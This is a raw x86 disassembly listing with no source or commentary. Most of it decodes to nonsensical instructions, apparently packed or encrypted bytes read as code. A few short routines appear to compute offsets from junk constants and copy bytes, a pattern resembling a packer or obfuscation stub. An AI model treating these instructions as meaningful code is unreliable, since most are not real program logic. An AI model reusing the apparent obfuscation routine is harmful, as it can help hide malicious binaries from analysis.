  414f52:	mov    ds:0x64e26fc9,eax
  414f57:	out    0xe2,al
  414f59:	call   0x75205248
  414f5e:	pop    edi
  414f5f:	int3   
  414f60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f61:	mov    ch,bl
  414f63:	out    0x2,eax
  414f65:	xchg   BYTE PTR [edi+0x35],al
  414f68:	add    al,0x51
  414f6a:	shl    DWORD PTR [ecx-0x2623a348],1
  414f70:	mov    ch,0xe
  414f72:	mov    al,0x3e
  414f74:	imul   edi,DWORD PTR [edx+0x41],0xffffffae
  414f78:	clc    
  414f79:	cmp    ebp,esp
  414f7b:	or     eax,DWORD PTR [edi+0x621f0d83]
  414f81:	data16 outs dx,BYTE PTR ds:[esi]
  414f83:	lds    edx,FWORD PTR [esi+0x16395f0b]
  414f89:	jo     0x414f47
  414f8b:	(bad)  
  414f8c:	mov    ebx,0x372b1344
  414f91:	shr    BYTE PTR [eax+0x17],cl
  414f94:	mov    dh,BYTE PTR [esi-0x20]
  414f97:	cmp    eax,0xf73e5965
  414f9c:	dec    edx
  414f9d:	push   ebp
  414f9e:	lods   eax,DWORD PTR ds:[esi]
  414f9f:	out    dx,eax
  414fa0:	push   0x29
  414fa2:	mov    esp,0xd2ccfc51
  414fa7:	shr    DWORD PTR [eax+eiz*4+0x1a],cl
  414fab:	inc    edi
  414fac:	(bad)  
  414fad:	and    eax,0xe23f0e78
  414fb2:	inc    ecx
  414fb3:	das    
  414fb4:	pop    edi
  414fb5:	jae    0x414f44
  414fb7:	popa   
  414fb8:	scas   eax,DWORD PTR es:[edi]
  414fb9:	xchg   edx,eax
  414fba:	xchg   esp,eax
  414fbb:	pop    ss
  414fbc:	js     0x414fe0
  414fbe:	retf   0xc0e8
  414fc1:	fdivrp st(4),st
  414fc3:	mov    esi,0xff025b2a
  414fc8:	es adc al,0x73
  414fcb:	pop    esi
  414fcc:	dec    ebx
  414fcd:	sub    eax,0x12586b97
  414fd2:	add    dl,BYTE PTR [ebx]
  414fd4:	lock push edi
  414fd6:	popf   
  414fd7:	or     esi,edx
  414fd9:	(bad)  [edi+0x1729655e]
  414fdf:	daa    
  414fe0:	cdq    
  414fe1:	mov    BYTE PTR [edi],dh
  414fe3:	in     eax,0xda
  414fe5:	into   
  414fe6:	repz inc ebp
  414fe8:	dec    ebp
  414fe9:	mov    BYTE PTR [ebp+0x2e8bca8c],ch
  414fef:	aas    
  414ff0:	retf   
  414ff1:	jmp    0x7b49636
  414ff6:	cwde   
  414ff7:	mov    ds:0xc30f2e44,eax
  414ffc:	icebp  
  414ffd:	ins    BYTE PTR es:[edi],dx
  414ffe:	mov    ds:0xcd6a2b89,al
  415003:	push   ss
  415004:	(bad)  
  415006:	rcl    BYTE PTR [edi],cl
  415008:	add    al,0x1c
  41500a:	and    esi,edi
  41500c:	cwde   
  41500d:	xchg   esp,eax
  41500e:	test   BYTE PTR [esi],ch
  415010:	in     al,0xeb
  415012:	mov    ebp,0x91269466
  415017:	rol    DWORD PTR [esi-0x1a],0xc7
  41501b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41501c:	fsub   DWORD PTR [edx-0x70d37078]
  415022:	inc    ebx
  415023:	fs into 
  415025:	dec    esp
  415026:	fnstcw WORD PTR [esp+ebp*4+0x2b]
  41502a:	rol    BYTE PTR [ebp+0x44],1
  41502d:	(bad)  
  41502e:	push   ds
  41502f:	mov    eax,0x67b8b4f9
  415034:	push   eax
  415035:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415036:	jp     0x4150b6
  415038:	xchg   ebp,eax
  415039:	dec    eax
  41503a:	int    0x70
  41503c:	sub    bl,BYTE PTR [eax-0x49]
  41503f:	cdq    
  415040:	mov    WORD PTR ds:0xedf02f02,gs
  415046:	aaa    
  415047:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415048:	jmp    0x9dc1:0xdb79a457
  41504f:	push   esp
  415050:	idiv   BYTE PTR [eax+ecx*1]
  415053:	in     eax,0x56
  415055:	jmp    0xdbe7d1cb
  41505a:	mov    dl,0xa6
  41505c:	mov    al,0xe1
  41505e:	dec    ecx
  41505f:	sahf   
  415060:	sub    al,0xfc
  415062:	out    dx,al
  415063:	aas    
  415064:	movnti DWORD PTR [ebx+ebp*1],esi
  415068:	adc    DWORD PTR [ebp+0x29],0x504927a5
  41506f:	in     eax,0xcf
  415071:	sub    edx,edx
  415073:	jnp    0x41501a
  415075:	or     BYTE PTR [ebx+ebx*2],cl
  415078:	clc    
  415079:	cdq    
  41507a:	and    DWORD PTR [edi+0x721ba4a],ecx
  415080:	mov    bh,0xc0
  415082:	js     0x41502c
  415084:	dec    ebp
  415085:	mov    ebp,0x5b83c655
  41508a:	lock push ss
  41508c:	ret    0xd81d
  41508f:	mov    eax,0xe7834ff
  415094:	mov    ds:0xe1356c7,al
  415099:	inc    eax
  41509a:	push   edx
  41509b:	cdq    
  41509c:	mov    gs,esi
  41509e:	push   es
  41509f:	xchg   ebx,eax
  4150a0:	cmp    eax,0x7a4d9dbf
  4150a5:	xchg   bx,ax
  4150a7:	cmp    ah,BYTE PTR [ebx-0x55b2e90e]
  4150ad:	inc    edx
  4150ae:	push   esi
  4150af:	lds    eax,FWORD PTR [edi+eax*2+0x7]
  4150b3:	rcl    edi,0xcf
  4150b6:	push   eax
  4150b7:	push   esp
  4150b8:	(bad)  
  4150b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4150ba:	repz js 0x415108
  4150bd:	or     edx,0xa348817c
  4150c3:	ror    cl,cl
  4150c5:	or     BYTE PTR [edx],0x4e
  4150c8:	sub    DWORD PTR [edx-0x45],ebx
  4150cb:	adc    ah,al
  4150cd:	sub    al,0x19
  4150cf:	add    ebx,DWORD PTR [ecx]
  4150d1:	frstor [ebx+0x2778ec9b]
  4150d7:	jbe    0x415076
  4150d9:	dec    ebp
  4150da:	(bad)  
  4150db:	es jle 0x415109
  4150de:	xchg   ebp,eax
  4150df:	ret    0x2fa5
  4150e2:	lods   al,BYTE PTR ds:[esi]
  4150e3:	push   edi
  4150e4:	mov    ds:0xa30600,eax
  4150e9:	je     0x41507b
  4150eb:	mov    edi,DWORD PTR [eax]
  4150ed:	inc    ebp
  4150ee:	outs   dx,DWORD PTR ds:[esi]
  4150ef:	mov    ebp,0x29a03034
  4150f4:	dec    ecx
  4150f5:	xor    BYTE PTR ds:[ebx],0xc7
  4150f9:	cmp    dl,dh
  4150fb:	imul   edi,DWORD PTR [esi-0x67],0xeaf44579
  415102:	or     edx,esp
  415104:	repnz call 0x467:0xe471104d
  41510c:	and    eax,0x8d864a70
  415111:	xor    dh,BYTE PTR [esi+0x41]
  415114:	shl    edx,cl
  415116:	shl    BYTE PTR es:[ecx],0xf0
  41511a:	out    dx,al
  41511b:	daa    
  41511c:	inc    ecx
  41511d:	not    DWORD PTR ss:[eax-0x67]
  415121:	cld    
  415122:	loop   0x415140
  415124:	or     ecx,DWORD PTR [esi-0x11]
  415127:	mov    dh,0x58
  415129:	cs jecxz 0x415143
  41512c:	inc    eax
  41512d:	dec    ebx
  41512e:	icebp  
  41512f:	xchg   esi,eax
  415130:	mov    ah,0xcd
  415132:	pushf  
  415133:	xchg   ecx,eax
  415134:	push   ds
  415135:	(bad)  
  415136:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415137:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415138:	mov    bl,0xfe
  41513a:	lods   eax,DWORD PTR ds:[esi]
  41513b:	std    
  41513c:	adc    eax,0x3e35e19e
  415141:	dec    ebx
  415142:	pusha  
  415143:	bnd ja 0x41511b
  415146:	sub    eax,0x7dc29891
  41514b:	pop    ecx
  41514c:	lahf   
  41514d:	icebp  
  41514e:	das    
  41514f:	lea    esi,[ecx+0x69908532]
  415155:	adc    esi,eax
  415157:	push   cs
  415158:	ja     0x4150e9
  41515a:	shr    DWORD PTR [edx-0x561b834e],0x35
  415161:	push   0x5cc7d9cf
  415166:	pusha  
  415167:	jae    0x4151ba
  415169:	in     eax,0xd6
  41516b:	fwait
  41516c:	pop    esp
  41516d:	xchg   ebx,eax
  41516e:	push   esi
  41516f:	mov    ah,0xfc
  415171:	(bad)  
  415172:	mov    edi,0x2c04e5ce
  415177:	test   eax,0xaa1b795c
  41517c:	imul   ecx,DWORD PTR [ebx-0x1ea35be3],0x704b8fb5
  415186:	sbb    DWORD PTR [esi],ebx
  415188:	push   esi
  415189:	bound  edx,QWORD PTR [edx]
  41518b:	xchg   BYTE PTR [edx-0x241278c5],al
  415191:	or     dl,0xef
  415194:	jbe    0x4151c0
  415196:	cwde   
  415197:	adc    BYTE PTR [edx+0x780868e6],ch
  41519d:	mov    ds:0x40ac2b6,eax
  4151a2:	es aad 0x1c
  4151a5:	ds js  0x415178
  4151a8:	int3   
  4151a9:	jb     0x41520a
  4151ab:	fldcw  WORD PTR ds:0xbb4003e9
  4151b1:	xor    dl,ch
  4151b3:	dec    ebp
  4151b4:	clc    
  4151b5:	retf   
  4151b6:	aam    0xe7
  4151b8:	clc    
  4151b9:	pop    eax
  4151ba:	mov    ds:0x4b80d43b,eax
  4151bf:	or     al,0x8f
  4151c1:	js     0x41514c
  4151c3:	sti    
  4151c4:	call   0x8e2f:0xc936bcdc
  4151cb:	xor    edi,DWORD PTR [ecx-0x68d63284]
  4151d1:	cmp    dl,BYTE PTR [edx]
  4151d3:	in     eax,0x8b
  4151d5:	push   esp
  4151d6:	and    al,0x14
  4151d8:	sub    DWORD PTR [eax],ecx
  4151da:	sbb    DWORD PTR [eax+0x4],edx
  4151dd:	mov    eax,DWORD PTR [esp+0xc]
  4151e1:	or     DWORD PTR [eax],0xca7da575
  4151e7:	or     DWORD PTR [eax+0x4],0x9c1b89e8
  4151ee:	lea    eax,[esp+0x18]
  4151f2:	push   eax
  4151f3:	lea    eax,[esp+0x24]
  4151f7:	push   eax
  4151f8:	call   0x4127df
  4151fd:	mov    eax,DWORD PTR [esp+0x18]
  415201:	mov    ecx,DWORD PTR [esp+0x1c]
  415205:	push   DWORD PTR [ebp+0x18]
  415208:	mov    ebx,DWORD PTR [ebp+0xc]
  41520b:	push   DWORD PTR [ebp+0x14]
  41520e:	mov    esi,DWORD PTR [ebp+0x8]
  415211:	push   DWORD PTR [ebp+0x10]
  415214:	push   DWORD PTR [esp+0x20]
  415218:	push   DWORD PTR [esp+0x20]
  41521c:	push   DWORD PTR [esp+0x38]
  415220:	push   DWORD PTR [esp+0x38]
  415224:	call   0x401000
  415229:	pop    esi
  41522a:	pop    ebx
  41522b:	mov    esp,ebp
  41522d:	pop    ebp
  41522e:	ret    0x14
  415231:	push   ebp
  415232:	mov    ebp,esp
  415234:	sub    esp,0x30
  415237:	mov    DWORD PTR [ebp-0x24],0x7c16
  41523e:	mov    DWORD PTR [ebp-0x20],0x53bd
  415245:	mov    DWORD PTR [ebp-0x18],0x3bd5
  41524c:	mov    DWORD PTR [ebp-0x1c],0x6ab6
  415253:	mov    DWORD PTR [ebp-0xc],0x4b9d
  41525a:	mov    DWORD PTR [ebp-0x8],0x7e48
  415261:	mov    DWORD PTR [ebp-0x4],0x604b
  415268:	mov    DWORD PTR [ebp-0x30],0x5b69
  41526f:	mov    DWORD PTR [ebp-0x2c],0x4521
  415276:	mov    DWORD PTR [ebp-0x28],0x2979
  41527d:	mov    DWORD PTR [ebp-0x14],0x9e8
  415284:	mov    DWORD PTR [ebp-0x10],0x40e5
  41528b:	mov    ecx,DWORD PTR [ebp-0x4]
  41528e:	mov    eax,DWORD PTR [ebp-0x8]
  415291:	add    ecx,0x1d04
  415297:	xor    ecx,eax
  415299:	mov    eax,DWORD PTR [ebp-0xc]
  41529c:	and    ecx,0x6f79
  4152a2:	imul   ecx,eax
  4152a5:	xor    ecx,0xe33ab1
  4152ab:	push   esi
  4152ac:	mov    DWORD PTR [ebp-0x4],0x5989
  4152b3:	mov    DWORD PTR [ebp-0x8],0x402c1
  4152ba:	mov    DWORD PTR [ebp-0xc],0x4114
  4152c1:	mov    eax,DWORD PTR [ebp-0xc]
  4152c4:	mov    esi,DWORD PTR [ebp-0x8]
  4152c7:	xor    edx,edx
  4152c9:	sub    eax,0x6cb6
  4152ce:	div    esi
  4152d0:	mov    edx,DWORD PTR [ebp-0x4]
  4152d3:	mov    esi,DWORD PTR [ebp+0xc]
  4152d6:	or     eax,edx
  4152d8:	xor    eax,0x67f1
  4152dd:	mov    edx,ecx
  4152df:	sub    edx,eax
  4152e1:	mov    DWORD PTR [ebp-0x4],edx
  4152e4:	mov    eax,DWORD PTR [ebp-0x4]
  4152e7:	mov    edx,DWORD PTR [ebp-0x4]
  4152ea:	mov    dl,BYTE PTR [edx+esi*1]
  4152ed:	mov    esi,DWORD PTR [ebp+0x8]
  4152f0:	mov    BYTE PTR [eax+esi*1],dl
  4152f3:	jmp    0x415646
  4152f8:	mov    cl,0x4a
  4152fa:	aas    
  4152fb:	(bad)  
  4152fc:	sbb    bh,BYTE PTR [edx-0x5f]
  4152ff:	sub    dh,BYTE PTR [esi+0x5a7e1b8c]
  415305:	sub    eax,0xebcbef0
  41530a:	push   ss
  41530b:	sbb    BYTE PTR [ebp+0x78181812],dh
  415311:	(bad)  
  415312:	imul   edi,eax,0x79
  415315:	ins    BYTE PTR es:[edi],dx
  415316:	dec    ecx
  415317:	mov    DWORD PTR [edx+0x8ac971a],esi
  41531d:	xor    al,0x9
  41531f:	(bad)  
  415321:	ins    DWORD PTR es:[edi],dx
  415322:	sub    DWORD PTR [edi+ebp*4-0x8ebd1ac],ecx
  415329:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41532a:	dec    esp
  41532b:	jl     0x41539a
  41532d:	call   0x2e7a:0x3e57fa64
  415334:	sbb    dl,al
  415336:	loop   0x4152ef
  415338:	lahf   
  415339:	jne    0x4152da
  41533b:	out    0x5f,al
  41533d:	nop
  41533e:	push   esp
  41533f:	lods   eax,DWORD PTR ds:[esi]
  415340:	(bad)  
  415341:	bound  ebp,QWORD PTR [edx+0x262cc614]
  415347:	push   0xe8caa4c4
  41534c:	fldl2e 
  41534e:	dec    ebx
  41534f:	out    dx,al
  415350:	fwait
  415351:	sar    DWORD PTR [ecx-0x58],0xc3
  415355:	hlt    
  415356:	repnz in eax,dx
  415358:	jl     0x415310
  41535a:	pop    esp
  41535b:	test   BYTE PTR [esi],0xc8
  41535e:	outs   dx,DWORD PTR ds:[esi]
  41535f:	cmp    ebx,edx
  415361:	mov    al,ds:0x6fcfc22
  415366:	mov    edi,0x8873df1b
  41536b:	jecxz  0x41534e
  41536d:	retf   
  41536e:	icebp  
  41536f:	or     BYTE PTR [esi-0x29971788],dh
  415375:	test   cl,0x65
  415378:	dec    edi
  415379:	jmp    0x4153ba
  41537b:	mov    ds:0x3f2e97e5,al
  415380:	adc    DWORD PTR [ecx+0x46712907],esi
  415386:	jnp    0x4153e6
  415388:	imul   esi,DWORD PTR [edi-0x78],0x39
  41538c:	dec    ebx
  41538d:	mov    ds:0x2b838cf,eax
  415392:	xor    edx,DWORD PTR [esi+0x1d]
  415395:	ins    DWORD PTR es:[edi],dx
  415396:	hlt    
  415397:	inc    esi
  415398:	popf   
  415399:	jno    0x41539a
  41539b:	retf   
  41539c:	adc    DWORD PTR [edi-0x5da2fba1],esp
  4153a2:	aas    
  4153a3:	or     ah,BYTE PTR [eax+0x32b20f42]
  4153a9:	jmp    0x1f1b:0xc7c73f28
  4153b0:	stos   DWORD PTR es:[edi],eax
  4153b1:	xor    BYTE PTR [ecx+0x45],dh
  4153b4:	dec    esi
  4153b5:	in     al,dx
  4153b6:	mov    edx,0xc440a035
  4153bb:	and    edx,ebp
  4153bd:	scas   al,BYTE PTR es:[edi]
  4153be:	fsubr  DWORD PTR [ebx+0x6d6aab37]
  4153c4:	push   0xffffffd2
  4153c6:	stos   BYTE PTR es:[edi],al
  4153c7:	mov    al,ds:0xce829cf7
  4153cc:	pop    ss
  4153cd:	aas    
  4153ce:	adc    ecx,ebx
  4153d0:	xrelease xchg BYTE PTR [esi-0x4671453],bl
  4153d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4153d8:	lea    edi,[esi]
  4153da:	test   BYTE PTR [eax],0x8f
  4153dd:	inc    bx
  4153df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4153e0:	or     al,0x93
  4153e2:	adc    BYTE PTR [ebp-0x5987aa8c],bl
  4153e8:	frstor es:[edx]
  4153ec:	xchg   DWORD PTR [edx+0x72],ebx
  4153ef:	jg     0x4153f1
  4153f1:	stc    
  4153f2:	in     al,0x48
  4153f4:	mov    ds:0x5404ad3,al
  4153f9:	call   0x3217:0x1daccc61
  415400:	loope  0x4153d5
  415402:	mov    dh,0x98
  415404:	xchg   ebx,eax
  415405:	lods   al,BYTE PTR ds:[esi]
  415406:	push   edi
  415407:	test   al,0x1f
  415409:	cmp    edx,DWORD PTR [edx+ebx*2]
  41540c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41540d:	or     esp,ebx
  41540f:	cmp    DWORD PTR [edx-0x2d660d46],esi
  415415:	arpl   ax,cx
  415417:	addr16 adc edx,ecx
  41541a:	call   0xfc39ac8e
  41541f:	adc    BYTE PTR ss:0xe71aab82,dl
  415426:	push   DWORD PTR [eax+0x1be0fa3c]
  41542c:	sbb    eax,DWORD PTR [ebx+0x677691f5]
  415432:	nop
  415433:	jo     0x415423
  415435:	es cwde 
  415437:	push   cs
  415438:	aam    0x19
  41543a:	cmp    eax,0xc27ca764
  41543f:	nop
  415440:	sbb    dl,BYTE PTR [ebp+0x74]
  415443:	sub    al,0x90
  415445:	out    0x52,eax
  415447:	sqrtps xmm3,XMMWORD PTR [esi]
  41544a:	mov    esp,0x798a792c
  41544f:	and    BYTE PTR [ebx-0x5a],0x16
  415453:	scas   eax,DWORD PTR es:[edi]
  415454:	aaa    
  415455:	loop   0x41549e
  415457:	jmp    0x2904513
  41545c:	pandn  mm3,mm3
  41545f:	pushf  
  415460:	mov    ?,WORD PTR [ebp+0x19]
  415463:	mov    bl,0xea
  415465:	jg     0x41547f
  415467:	mov    esp,DWORD PTR [ebx]
  415469:	adc    eax,0x3b96402c
  41546e:	rol    BYTE PTR [edi],cl
  415470:	shr    esi,0x2b
  415473:	and    al,BYTE PTR [edi-0x2f321ad6]
  415479:	sbb    eax,0x42f8f61d
  41547e:	cmovo  edx,DWORD PTR [edi+0x6d]
  415482:	inc    ebp
  415483:	xchg   ebp,eax
  415484:	shl    BYTE PTR [ebp-0x18],cl
  415487:	push   edx
  415488:	or     eax,0xab217312
  41548d:	sub    ah,BYTE PTR [ecx+0x5a]
  415490:	in     eax,dx
  415491:	inc    BYTE PTR [edi]
  415493:	pop    esp
  415494:	ss ins DWORD PTR es:[edi],dx
  415496:	in     al,0x8c
  415498:	rol    DWORD PTR [ebp-0x5bc4b04d],cl
  41549e:	fimul  WORD PTR [ecx-0x15]
  4154a1:	scas   eax,DWORD PTR es:[edi]
  4154a2:	fisub  DWORD PTR [edx]
  4154a4:	hlt    
  4154a5:	cmp    dh,ch
  4154a7:	jb     0x41543b
  4154a9:	or     DWORD PTR [edi],ebx
  4154ab:	ret    
  4154ac:	enter  0x1da3,0x21
  4154b0:	stos   DWORD PTR es:[edi],eax
  4154b1:	mul    al
  4154b3:	xlat   BYTE PTR ds:[ebx]
  4154b4:	inc    ebx
  4154b5:	cmp    dh,dh
  4154b7:	movsx  ebx,WORD PTR [edi+0x6b]
  4154bb:	lea    edi,[eax-0x30b136fa]
  4154c1:	and    ecx,ebx
  4154c3:	out    dx,eax
  4154c4:	sahf   
  4154c5:	mov    ebp,0x91683ec6
  4154ca:	xor    ch,BYTE PTR [edx+0x64447b6b]
  4154d0:	add    DWORD PTR [edx+0x45],esi
  4154d3:	mov    ebp,0xd61a8407
  4154d8:	sbb    eax,0xc401618c
  4154dd:	cmp    al,0xaf
  4154df:	sub    dl,dl
  4154e1:	pop    ebp
  4154e2:	push   ss
  4154e3:	shr    dl,0x47
  4154e6:	and    dl,0x97
  4154e9:	mov    ch,0x4a
  4154eb:	push   DWORD PTR [ebp+0x4e]
  4154ee:	clc    
  4154ef:	pop    ebx
  4154f0:	add    edi,DWORD PTR [edi+0x1cb35e02]
  4154f6:	dec    esi
  4154f7:	xchg   edi,eax
  4154f8:	push   ebp
  4154f9:	cmp    edi,DWORD PTR [ebx+0x559aa99a]
  4154ff:	sbb    al,0x75
  415501:	or     esp,ebx
  415503:	out    0xdc,al
  415505:	push   esp
  415506:	adc    ecx,DWORD PTR [eax]
  415508:	shl    DWORD PTR [ecx+0x68a0f01d],0x10
  41550f:	mov    dh,0xc2
  415511:	pop    edx
  415512:	xchg   dl,al
  415514:	div    BYTE PTR [esi+0x19]
  415517:	test   DWORD PTR [edx+0x35333462],eax
  41551d:	nop
  41551e:	jnp    0x4154df
  415520:	push   ebx
  415521:	(bad)  
  415522:	sti    
  415523:	mov    ds:0x9afc7e00,al
  415528:	hlt    
  415529:	adc    DWORD PTR [esi+edi*4],ebx
  41552c:	rol    BYTE PTR [ebx-0x59],0xe
  415530:	mov    DWORD PTR ds:0xbb3c76e4,eax
  415536:	daa    
  415537:	jns    0x4154de
  415539:	data16 into 
  41553b:	mov    ecx,0xc0333b05
  415540:	pop    ss
  415541:	ficomp WORD PTR [edi-0x26]
  415544:	cmp    DWORD PTR [edx+0x46],esp
  415547:	inc    ebp
  415548:	test   eax,0xb211073f
  41554d:	fist   DWORD PTR [esi]
  41554f:	xor    eax,0xd12bc0a
  415554:	or     eax,0xebe09dd8
  415559:	or     ah,BYTE PTR gs:[esi-0x2c06894f]
  415560:	dec    ebx
  415561:	pusha  
  415562:	mov    bl,0xd7
  415564:	cld    
  415565:	ret    0xcb93
  415568:	push   eax
  415569:	cmp    BYTE PTR [edx+0x47],dh
  41556c:	push   ecx
  41556d:	in     al,dx
  41556e:	mov    bl,dh
  415570:	jmp    0x32d9:0xcf1e9bbd
  415577:	fld    TBYTE PTR [eax]
  415579:	xlat   BYTE PTR ds:[ebx]
  41557a:	push   ss
  41557b:	sbb    DWORD PTR ds:0x7cf90ffa,0xffffffb6
  415582:	scas   al,BYTE PTR es:[edi]
  415583:	push   edx
  415584:	push   edx
  415585:	loope  0x4155e4
  415587:	outs   dx,BYTE PTR ds:[esi]
  415588:	(bad)  
  415589:	push   esi
  41558a:	xchg   edi,eax
  41558b:	ss xchg edx,eax
  41558d:	dec    edx
  41558e:	je     0x41559f
  415590:	hlt    
  415591:	sbb    al,0x2f
  415593:	dec    ebx
  415594:	xchg   esi,eax
  415595:	inc    ebp
  415596:	push   0x2f
  415598:	out    0x3a,eax
  41559a:	popa   
  41559b:	jbe    0x41555a
  41559d:	pop    ebx
  41559e:	jl     0x41556e
  4155a0:	xor    ecx,DWORD PTR [esi-0x39e31d]
  4155a6:	bound  ebx,QWORD PTR [eax+0x93de76a]
  4155ac:	fisubr DWORD PTR [ebp-0x20d998c7]
  4155b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4155b3:	test   DWORD PTR [ecx],0xd092b3d2
  4155b9:	sbb    bl,dh
  4155bb:	ins    BYTE PTR es:[edi],dx
  4155bc:	jle    0x415602
  4155be:	rcl    BYTE PTR [edx],1
  4155c0:	jmp    0xdf9ae80c
  4155c5:	jae    0x415587
  4155c7:	out    0xf5,al
  4155c9:	loope  0x4155c5
  4155cb:	sbb    al,0xe9
  4155cd:	xlat   BYTE PTR ds:[ebx]
  4155ce:	mov    al,0x82
  4155d0:	add    dl,bl
  4155d2:	mov    edi,esi
  4155d4:	mov    ds:0xc0b37a8a,eax
  4155d9:	push   ebp
  4155da:	or     al,0x66
  4155dc:	sub    BYTE PTR [ecx-0x6a7a4181],al
  4155e2:	scas   eax,DWORD PTR es:[edi]
  4155e3:	adc    dh,BYTE PTR [ebp-0x66]
  4155e6:	scas   eax,DWORD PTR es:[edi]
  4155e7:	add    edx,edi
  4155e9:	sahf   
  4155ea:	cld    
  4155eb:	dec    edi
  4155ec:	int3   
  4155ed:	ret    0x43ea
  4155f0:	inc    esp
  4155f1:	jmp    0x9197:0x69a60fb1
  4155f8:	jmp    0x37f9:0x17200586
  4155ff:	scas   al,BYTE PTR es:[edi]
  415600:	xor    ecx,DWORD PTR [ebx]
  415602:	sub    BYTE PTR [esi-0x5e],dh
  415605:	mov    ds:0xc243416e,al
  41560a:	jle    0x4155e2
  41560c:	xchg   ecx,eax
  41560d:	cdq    
  41560e:	jle    0x4155fe
  415610:	pusha  
  415611:	call   0xf2c4:0xf7eee2e
  415618:	mov    cl,0x2e
  41561a:	push   ebx
  41561b:	and    al,0x5
  41561d:	dec    esi
  41561e:	adc    BYTE PTR es:[ebx],ch
  415621:	sbb    BYTE PTR [edx],ah
  415623:	pusha  
  415624:	lds    edi,FWORD PTR [eax-0x5c9375fa]
  41562a:	jecxz  0x415682
  41562c:	imul   eax,DWORD PTR [ebp+0x2fbc6634],0x24
  415633:	sahf   
  415634:	fadd   st,st(2)
  415636:	stos   BYTE PTR es:[edi],al
  415637:	push   eax
  415638:	repz jge 0x415673
  41563b:	test   BYTE PTR [ebp+0x6849a1b5],0x42
  415642:	lock xchg edi,eax
  415644:	rcl    DWORD PTR [ebx-0x740fba75],0x55
  41564b:	in     al,dx
  41564c:	imul   eax,eax,0x43bd290
  415652:	and    eax,edx
  415654:	or     eax,0x1a40
  415659:	xor    eax,0x1ac1
  41565e:	add    ecx,eax
  415660:	mov    eax,DWORD PTR [ebp-0x18]
  415663:	mov    edx,0x7380
  415668:	sub    edx,eax
  41566a:	add    edx,DWORD PTR [ebp-0x1c]
  41566d:	jmp    0x4159c0
  415672:	pop    esp
  415673:	pushf  
  415674:	lds    eax,FWORD PTR [ebp+eax*2+0x1c]
  415678:	pop    esp
  415679:	pushf  
  41567a:	push   ss
  41567b:	cwde   
  41567c:	pop    ebx
  41567d:	jo     0x41562c
  41567f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415680:	xlat   BYTE PTR ds:[ebx]
  415681:	mov    esp,0x18160858
  415686:	mov    ch,0x12
  415688:	sbb    BYTE PTR [eax],bl
  41568a:	xor    DWORD PTR ds:0x1c0de119,esp
  415690:	lea    eax,[edx+eiz*4]
  415693:	or     bh,BYTE PTR [eax+0x1b]
  415696:	sub    al,0x34
  415698:	mov    eax,0xa1e46957
  41569d:	adc    BYTE PTR [eax+0xe],ch
  4156a0:	pop    ss
  4156a1:	imul   esi,DWORD PTR [esi+esi*8-0x39b54592],0x52
  4156a9:	fs f2xm1 
  4156ac:	cwde   
  4156ad:	adc    al,0x98
  4156af:	cmp    bl,BYTE PTR [edi-0x75]
  4156b2:	les    edi,FWORD PTR ds:0xe52ee67a
  4156b8:	scas   al,BYTE PTR es:[edi]
  4156b9:	push   cs
  4156ba:	lock cmp ah,BYTE PTR [ecx+esi*8]
  4156be:	mov    dl,0x6e
  4156c0:	test   al,0x21
  4156c2:	lds    ebx,FWORD PTR [eax-0x6d4cac57]
  4156c8:	out    0x8b,al
  4156ca:	push   0x61
  4156cc:	adc    ah,BYTE PTR [edx]
  4156ce:	pushf  
  4156cf:	sub    al,0x8
  4156d1:	mov    bh,0x68
  4156d3:	sahf   
  4156d4:	sub    eax,0x3b7431a9
  4156d9:	pop    ebp
  4156da:	mov    esp,0xf7d17b64
  4156df:	(bad)  
  4156e0:	jl     0x415670
  4156e2:	lods   eax,DWORD PTR ds:[esi]
  4156e3:	test   DWORD PTR [ebp-0x39],eax
  4156e6:	test   al,0xe2
  4156e8:	sub    ah,BYTE PTR [ebx+0x2f4d341a]
  4156ee:	scas   al,BYTE PTR es:[edi]
  4156ef:	mov    dl,0x85
  4156f1:	add    ebp,esi
  4156f3:	xor    dh,al
  4156f5:	stos   DWORD PTR es:[edi],eax
  4156f6:	dec    edi
  4156f7:	xchg   ah,al
  4156f9:	icebp  
  4156fa:	aaa    
  4156fb:	or     esp,DWORD PTR [eax+0x680331d1]
  415701:	fisttp QWORD PTR [ebp-0x278f190f]
  415707:	cs dec edi
  415709:	push   ebx
  41570a:	loop   0x4156ea
  41570c:	test   eax,0x6194636c
  415711:	cli    
  415712:	lock lds edx,FWORD PTR [ecx+0x28]
  415716:	mov    eax,ds:0x4f2bfb55
  41571b:	mov    es,eax
  41571d:	inc    BYTE PTR ds:0x63842ffe
  415723:	jae    0x4156e5
  415725:	jno    0x4156c2
  415727:	inc    esi
  415728:	ins    DWORD PTR es:[edi],dx
  415729:	pusha  
  41572a:	push   esp
  41572b:	and    al,BYTE PTR [ebp+0x33]
  41572e:	jl     0x4156e3
  415730:	das    
  415731:	cmp    al,BYTE PTR [ecx]
  415733:	xchg   edi,eax
  415734:	adc    BYTE PTR [edi],dl
  415736:	and    eax,0x7ff128a4
  41573b:	fmul   QWORD PTR [esi-0x36]
  41573e:	repnz pop ebx
  415740:	cs xchg ebx,eax
  415742:	arpl   WORD PTR [ecx-0x7d17e6f3],di
  415748:	mov    al,ds:0x7ddaf98e
  41574d:	jle    0x41578c
  41574f:	and    eax,0xf56c4d22
  415754:	and    BYTE PTR [ecx],0xd0
  415757:	or     eax,0x4d15fcd2
  41575c:	test   eax,0x1998d7b4
  415761:	jle    0x415746
  415763:	inc    ebp
  415764:	out    0x31,al
  415766:	cmp    BYTE PTR [edi],0xfd
  415769:	mov    dl,0xfe
  41576b:	jle    0x415739
  41576d:	xchg   esp,eax
  41576e:	jno    0x415716
  415770:	scas   eax,DWORD PTR es:[edi]
  415771:	sbb    bh,ch
  415773:	ror    DWORD PTR [eax+0x7f002be6],0xc8
  41577a:	popf   
  41577b:	jns    0x4157e5
  41577d:	out    0xf6,al
